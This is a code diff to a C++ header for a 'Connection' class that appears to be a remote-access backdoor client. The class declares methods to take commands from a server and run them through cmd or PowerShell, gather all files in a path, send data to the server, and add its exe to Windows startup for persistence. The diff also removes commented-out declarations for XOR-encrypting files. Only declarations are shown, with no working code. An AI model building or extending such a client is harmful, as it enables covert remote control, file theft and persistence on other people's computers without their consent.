@@ -58,31 +58,20 @@ public:
     //Sending data to the server
     void sendMessage(const char *data);
 
-    //Getting command from the server
-    string e1(string &b1);
+    //Getting cmd command from the server
+    string runCmdCommand(string &command);
+
+    //Getting powershell command or script from the server
+    string runPowershellCommand(string &command);
 
     //Saving all files in path
     string Connection::getAllFiles(string path);
 
-    //Encrypt data with xor encryption with key
-    //string encryptData(string data, string key);
-
-    //Encrypt all the files in path with xor
-    //void encryptFiles(string path);
-
-    //Read file in path
-    //string readFile(filesystem::path path);
-
-    //Write data to a file in path
-    //void writeToFile(filesystem::path path, string data);
-
     //Starting the first connection
-
     int startConnection();
 
     //Creating the connection
     void connection();
-
 
     //Get process name by his PID
     string getProcessName(int pid);
@@ -92,7 +81,6 @@ public:
 
     //Opening the exe file in windows startup
     int boot();
-
 
 };
 
